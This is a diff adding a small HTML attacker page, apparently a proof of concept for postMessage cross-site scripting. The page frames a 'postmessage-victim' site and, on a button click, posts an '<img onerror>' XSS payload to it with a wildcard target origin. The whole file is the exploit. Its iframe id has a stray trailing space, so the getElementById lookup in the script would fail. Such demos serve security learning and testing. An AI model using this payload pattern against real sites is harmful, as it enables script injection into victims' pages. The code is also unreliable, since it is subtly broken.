@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Vercel</title>
+</head>
+<body>
+<iframe  id="attackeriframe "src="https://postmessage-victim.vercel.app/victim.html"></iframe>
+<script>
+    function attack(){
+    var aiframe = document.getElementById("attackeriframe")
+     aiframe.contentWindow.postMessage({
+        name:"<img src=x onerror=alert(document.domain)>"
+     },"*")
+    }
+
+</script>
+<button onclick="attack()">Click here</button>
+</body>
+</html>
